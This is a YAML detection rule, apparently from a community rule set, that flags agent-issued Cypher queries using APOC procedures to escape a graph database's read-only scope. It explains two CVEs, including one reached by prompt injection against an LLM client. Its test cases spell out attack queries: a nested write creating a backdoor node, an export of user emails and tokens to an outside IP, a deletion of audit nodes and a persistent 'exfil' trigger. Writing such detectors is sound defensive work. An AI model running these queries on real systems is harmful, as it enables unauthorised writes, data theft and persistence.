title: "APOC Procedure Escape in Agent-Issued Cypher"
id: ATR-2026-02527
rule_version: 1
status: draft
description: >
  Detects a Cypher statement reaching a graph-database MCP server or agent
  tool that calls an APOC procedure whose effect is outside the read path the
  agent was scoped to: writing through a nested-execution procedure, pushing
  graph contents out over a URI, or installing a trigger that runs on every
  future transaction.

  Two 2026 advisories converge on this: CVE-2026-35402 (mcp-neo4j-cypher
  before 0.6.0 — the server's read_only mode is enforced by inspecting the
  submitted statement, and APOC CALL procedures slip past that inspection,
  yielding unauthorised writes or SSRF) and CVE-2026-32247 (Graphiti before
  0.28.2 — attacker-controlled label values concatenated into Cypher, stated
  by the advisory to be reachable through prompt injection against an LLM
  client induced to call search_nodes).

  WHY THE PROCEDURE NAME AND NOT THE INJECTION. The break-out half of
  CVE-2026-32247 — a label value that closes its identifier with a backtick
  or paren and continues with a Cypher clause — is already detected by
  ATR-2026-02143, and this rule deliberately does not restate it. What is not
  detected anywhere is the PAYLOAD half: the procedure the attacker calls
  once inside. That is where read_only mode is defeated, and it is why
  CVE-2026-35402 needed a fix at all — the statement is syntactically valid,
  contains no injection metacharacters, and passes a read-only check that
  only looks for MATCH/CREATE/MERGE keywords.

  SCOPE, drawn against what the corpus already owns. Three families remain,
  each measured as uncovered on origin/main before this rule was written:
    - apoc.cypher.doIt / runWrite / runSchema / runFirstColumn / runMany
      invoked with a quoted inner statement that WRITES — the inner text is
      never seen by the outer read-only check.
    - apoc.export.* whose DESTINATION argument is a URI: graph contents pushed
      outward. A URI appearing inside the exported query is data, not a sink.
    - apoc.trigger.add / install, apoc.custom.as|declare|installProcedure /
      Function, apoc.systemdb.execute: persistence into later transactions.
      Registration verbs only — list / show / remove / removeAll / uninstall
      and apoc.systemdb.graph are inventory or remediation, not escape.

  AN ADVERSARIAL PASS ON 2026-08-23 narrowed all three. Matching a bare
  procedure NAME fired on the APOC manual, on advisory text describing this
  very CVE, on a deprecation changelog, on a GitHub issue, and on an MCP
  server's own description of the procedures it blocks. Matching any method on
  the trigger / custom / systemdb namespaces fired on apoc.trigger.list(),
  apoc.custom.list() and apoc.trigger.remove() — i.e. it alerted on the
  operator inspecting and then cleaning up. An unanchored bridge to a URI
  fired on a local-file export whose query filtered on a https:// property and
  on a runbook line with a docs link trailing the call. Each condition now
  requires the invocation shape, not the vocabulary.

  TWO THINGS DELIBERATELY LEFT OUT. dbms.security.* is already detected by
  ATR-2026-02100, so restating it here would be duplicate coverage. apoc.load.*
  is excluded for a stronger reason: ATR-2026-02100 carries
  apoc.load.json('https://api.example.com/public-catalog.json') as a declared
  true_negative, so the corpus has already ruled that inbound load from a
  public URL is legitimate, and a rule that fired on it would be a precision
  regression for its neighbour. Inbound load aimed at an internal or metadata
  address is covered by ATR-2026-01605 and ATR-2026-00013.

  BOUNDARY, stated plainly. A graph ETL agent whose actual job is to export to
  an object-storage URL will match. That is a triage cost, not a bug: the same
  call in a read-scoped question-answering agent is the CVE. The rule cannot
  read the server's read_only setting, its procedure allowlist, or the
  database role, so it reports the reach, not the outcome.
author: "ATR Community"
date: "2026/08/23"
schema_version: "0.1"
detection_tier: pattern
maturity: test
severity: high

references:
  cve:
    - "CVE-2026-35402"
    - "CVE-2026-32247"
  cwe:
    - "CWE-284"
    - "CWE-943"
  owasp_llm:
    - "LLM01:2025"
    - "LLM05:2025"
  owasp_agentic:
    - "ASI02:2026"
  mitre_atlas:
    - "AML.T0051.001 - Indirect"
    - "AML.T0053 - LLM Plugin Compromise"

compliance:
  owasp_llm:
    - id: "LLM05:2025"
      context: "The model's output is a query string handed straight to a graph driver, so an unchecked procedure call is unchecked execution."
      strength: primary
    - id: "LLM01:2025"
      context: "CVE-2026-32247 explicitly names prompt injection against the LLM client as the route by which the attacker-chosen query reaches the server."
      strength: secondary
  owasp_agentic:
    - id: "ASI02:2026"
      context: "The graph query tool is invoked normally; the abuse is a procedure whose reach exceeds the read scope the tool was granted."
      strength: primary
  eu_ai_act:
    - article: "15"
      context: "Article 15 robustness for an agent with database access means the enforced scope cannot be dissolved by the content of a generated query; these detections show when it was attempted."
      strength: primary
    - article: "9"
      context: "Read-scope bypass through a nested-execution procedure is a concrete risk for any graph-backed agent and belongs in the Article 9 risk register with monitoring evidence."
      strength: secondary
    - article: "12"
      context: "Recording the procedure a generated query attempted to reach gives the traceable log Article 12 requires for post-incident reconstruction."
      strength: secondary
  nist_ai_rmf:
    - function: Manage
      subcategory: "MG.2.3"
      context: "Runtime treatment for the risk that an agent's read-only database scope is bypassed by procedure invocation rather than by injection syntax."
      strength: primary
    - function: Measure
      subcategory: "MS.2.7"
      context: "Detection events document the security of the agent-to-graph boundary, including statements a keyword-based read-only check accepts."
      strength: secondary
    - function: Map
      subcategory: "MP.5.1"
      context: "Catalogues procedure-level scope escape as a risk distinct from query injection: the query is well-formed and unescaped."
      strength: secondary
  iso_42001:
    - clause: "8.1"
      context: "Operational control of an AI system with database access requires that the granted scope holds against the system's own generated queries."
      strength: primary
    - clause: "8.4"
      context: "Impact assessment for a graph-backed agent must include unauthorised write and outbound data movement; these detections are the supporting evidence."
      strength: secondary
    - clause: "6.2"
      context: "Keeping a read-scoped agent read-only is an AIMS security objective, operationalised here as a runtime detection."
      strength: secondary

tags:
  category: privilege-escalation
  subcategory: graph-query-scope-escape
  scan_target: both
  confidence: medium

agent_source:
  type: mcp_exchange
  framework:
    - any
  provider:
    - any

detection:
  condition: any
  conditions:
    # -- Nested execution carrying a write payload --
    # The procedure NAME alone is not evidence: APOC's own manual, the
    # CVE-2026-35402 advisory, a changelog deprecating doIt, and an MCP server's
    # own tool description all name these procedures in ordinary prose, and an
    # adversarial pass on 2026-08-23 fired this rule on every one of them.
    # What is evidence is an actual invocation whose first argument is a quoted
    # inner statement that writes — that is precisely the text the outer
    # read-only check never analyses. A signature line like
    # `apoc.cypher.doIt(statement, params)` has no quoted literal and no longer
    # matches. Cost: a nested call whose statement arrives via a parameter
    # (`apoc.cypher.doIt($stmt, {})`) is not detected.
    - field: content
      operator: regex
      value: '(?i)\bapoc\.cypher\.(?:doit|runwrite|runschema|runfirstcolumn|runmany)\s*\(\s*[''"]\s*(?:(?:create|merge|set|delete|detach|remove|drop|foreach)\b|(?:match|unwind|with|optional|profile|explain)\b[^''"]{0,60}\b(?:create|merge|set|delete|detach|remove|drop)\b)'
      description: "APOC nested-execution procedure invoked with a quoted inner statement that writes — the second Cypher statement a statement-inspecting read_only guard never analyses"

    # -- Outbound data movement: graph contents pushed to a URI DESTINATION --
    # apoc.load.* is deliberately excluded: ATR-2026-02100 carries
    # `apoc.load.json('https://api.example.com/public-catalog.json')` as a
    # declared true_negative, i.e. the corpus has already ruled that inbound
    # load from a public URL is legitimate. Inbound load to an internal or
    # metadata address is covered by ATR-2026-01605 / ATR-2026-00013.
    # The URI must occupy a DESTINATION argument slot — a quoted scheme
    # immediately followed by the config map or the end of the call. An
    # unanchored bridge matched URLs that were merely DATA inside the exported
    # query (`WHERE p.url STARTS WITH 'https://docs.example.com/'`) and even a
    # documentation link trailing the call in a runbook line.
    - field: content
      operator: regex
      value: '(?i)\bapoc\.export\.[a-z0-9.]{1,24}\s*\([\s\S]{0,180}[''"](?:https?|ftps?|jdbc|s3|gs|smb)://[^''"\s]{1,200}[''"]\s*(?:,\s*\{|\)\s*(?:;|$))'
      description: "APOC export procedure whose destination argument is a URI — pushes graph contents out to an attacker-controlled endpoint"

    # -- Persistence: registration verbs only --
    # `apoc.trigger.list`, `apoc.trigger.remove`, `apoc.custom.list` and
    # `apoc.systemdb.graph` are read-only inventory or REMEDIATION calls; the
    # previous `apoc\.(?:trigger|systemdb|custom)\.[a-z]{1,24}\(` fired on all
    # of them, i.e. it alerted on the operator cleaning up after the incident.
    # Only the verbs that install something that outlives the session remain,
    # and only when given a quoted literal argument so that a documentation
    # signature line does not match.
    - field: content
      operator: regex
      value: '(?i)\bapoc\.(?:trigger\.(?:add|install)|custom\.(?:as|declare|install)(?:procedure|function)|systemdb\.execute)\s*\(\s*[''"]'
      description: "APOC trigger / custom-procedure / systemdb registration with a literal statement — installs Cypher that executes on later transactions, outliving the session that requested it"

  false_positives:
    - "A graph ETL agent whose declared job includes apoc.export to a known sink URL. Expected to match; the same call from a read-scoped question-answering agent is CVE-2026-35402, and the engine cannot tell the two apart from one event"
    - "A scheduled graph backup implemented as apoc.export to an object-storage URL, or an operator installing a legitimate audit trigger through an agent tool"
    - "A schema migration run through apoc.cypher.runMany (CREATE INDEX / CREATE CONSTRAINT). Verified to match on 2026-08-23 and left matching: it is a genuine nested write, and from one event the engine cannot separate a migration the operator intended from the same statement injected into a read-scoped agent"
    - "A documentation EXAMPLE that is byte-identical to the attack — an APOC manual snippet showing CALL apoc.trigger.add('myTrigger','UNWIND ...',{phase:'after'}) quoted back through a tool response. Prose that merely NAMES these procedures no longer matches (verified against APOC manual text, CVE advisory text, a deprecation changelog and an MCP server tool description), but a runnable example is indistinguishable from a real call in a single event"

response:
  actions:
    - block_tool
    - alert
  auto_response_threshold: high
  message_template: >
    [ATR-2026-02527] Agent-issued Cypher calls an APOC procedure that reaches
    beyond a read scope — a nested statement that writes, an export whose
    destination is a URI, or a trigger / custom-procedure registration that
    outlives this session. Verify the server's read_only setting and procedure
    allowlist before this statement runs.

confidence: 72

test_cases:
  true_positives:
    - input: "CALL apoc.cypher.doIt('CREATE (:Backdoor {k:1}) RETURN 1', {}) YIELD value RETURN value"
      expected: triggered
      description: "Write smuggled through nested execution, the read_only bypass of CVE-2026-35402"
    - input: "{\"name\":\"read_neo4j_cypher\",\"arguments\":{\"query\":\"RETURN apoc.cypher.runFirstColumn('MERGE (:Admin {u:1}) RETURN 1', {}) AS r\"}}"
      expected: triggered
      description: "Same bypass arriving as an MCP tool argument on a read-labelled tool"
    - input: "CALL apoc.export.csv.query('MATCH (u:User) RETURN u.email, u.token', 'https://198.51.100.7/drop.csv', {})"
      expected: triggered
      description: "Graph contents exported directly to an attacker-controlled URL"
    - input: "CALL apoc.cypher.runWrite('MATCH (n:Audit) DETACH DELETE n', {}) YIELD value RETURN value"
      expected: triggered
      description: "Explicit write procedure reached through a read-labelled query tool"
    - input: "CALL apoc.trigger.add('exfil','MATCH (n) RETURN n',{phase:'after'})"
      expected: triggered
      description: "Trigger persistence — attacker Cypher runs on every later transaction"
  true_negatives:
    - input: "MATCH (p:Person)-[:KNOWS]->(f) WHERE p.name = $name RETURN f.name LIMIT 25"
      expected: not_triggered
      description: "Parameterised read query, the ordinary output of a graph question-answering agent"
    - input: "The Neo4j APOC library provides apoc.load.json for reading JSON, but our MCP server runs read-only so the procedure allowlist matters."
      expected: not_triggered
      description: "Documentation naming an APOC procedure without invoking it against a URI"
    - input: "apoc.load.json('https://api.example.com/public-catalog.json')"
      expected: not_triggered
      description: "Inbound load from a public URL — ATR-2026-02100 declares this benign, so this rule must not fire on it"
    - input: "CALL apoc.export.csv.all('/var/backups/graph-2026-08-23.csv', {})"
      expected: not_triggered
      description: "Scheduled export to a local filesystem path, with no URI destination"
    - input: "MATCH (a:Account) WHERE a.created_at > datetime('2026-01-01') RETURN count(a)"
      expected: not_triggered
      description: "Aggregation query containing a quoted date, no procedure call"
    - input: "CALL db.labels() YIELD label RETURN label ORDER BY label"
      expected: not_triggered
      description: "Schema introspection through an ordinary db. procedure, which read-only mode permits"
    - input: "{\"node_labels\": [\"Person\", \"Employee\"]}"
      expected: not_triggered
      description: "Plain label values — the neighbouring rule ATR-2026-02143 owns this field, and this rule must not fire on its benign set"
    - input: "CALL apoc.meta.stats() YIELD labelCount, relTypeCount RETURN labelCount, relTypeCount"
      expected: not_triggered
      description: "Read-only APOC metadata procedure, outside every family this rule names"
    - input: "apoc.cypher.doIt(statement, params) runs a Cypher statement with the given parameters in a separate transaction and returns the result. Unlike apoc.cypher.run it is allowed to perform updates."
      expected: not_triggered
      description: "APOC manual prose naming the procedure and its signature — an unanchored name match fired on this on 2026-08-23"
    - input: "Advisory: the read_only guard inspects the submitted statement for write keywords, so a caller can smuggle a write by wrapping it in apoc.cypher.doIt or apoc.cypher.runWrite. Mitigation: drop apoc.cypher.* from the procedure allowlist."
      expected: not_triggered
      description: "Security advisory describing this exact attack class — ATR's own writeups must not trip this rule"
    - input: "read_neo4j_cypher: executes a read-only Cypher query. Nested-execution procedures (apoc.cypher.doIt, apoc.cypher.runWrite, apoc.cypher.runFirstColumn) are rejected by the server allowlist."
      expected: not_triggered
      description: "A legitimate MCP tool description naming the procedures it blocks"
    - input: "CALL apoc.trigger.list() YIELD name, query, selector, paused RETURN name, paused ORDER BY name"
      expected: not_triggered
      description: "Read-only trigger inventory — the previous condition alerted on an operator asking what is installed"
    - input: "CALL apoc.trigger.remove('exfil') YIELD name RETURN name"
      expected: not_triggered
      description: "Trigger REMOVAL is remediation; alerting on the cleanup after the incident is backwards"
    - input: "CALL apoc.custom.list() YIELD name, description RETURN name, description ORDER BY name"
      expected: not_triggered
      description: "Read-only inventory of registered custom procedures"
    - input: "CALL apoc.export.csv.query(\"MATCH (p:Page) WHERE p.url STARTS WITH 'https://docs.example.com/' RETURN p.url, p.title\", 'pages-2026-08-23.csv', {})"
      expected: not_triggered
      description: "Export to a LOCAL file whose exported query merely contains a URL as data — the URI is not the destination argument"
    - input: "Step 4: CALL apoc.export.graphml.all('/var/backups/graph.graphml', {}) -- option reference: https://neo4j.com/labs/apoc/5/export/graphml/"
      expected: not_triggered
      description: "Runbook line: local export followed by a documentation link the old bridge span walked into"
    - input: "CALL apoc.systemdb.graph() YIELD nodes, relationships RETURN size(nodes) AS n"
      expected: not_triggered
      description: "Read-only systemdb introspection, not a registration verb"
    - input: "5.26.0 - deprecated apoc.cypher.doIt in favour of the CALL {} IN TRANSACTIONS syntax; apoc.trigger.add is replaced by apoc.trigger.install."
      expected: not_triggered
      description: "Library changelog naming both families in prose"
    - input: "RETURN apoc.cypher.runFirstColumn('MATCH (n:Person) RETURN n.name ORDER BY n.name', {}) AS names"
      expected: not_triggered
      description: "Nested execution whose inner statement only READS — no read-scope escape, so no alert"
    - input: "RETURN apoc.cypher.runFirstColumn('MATCH (n:Dataset) WHERE n.status = $s RETURN n.settings, n.created', {}) AS rows"
      expected: not_triggered
      description: "Substring trap: Dataset / settings / created contain set and create but carry no word boundary"
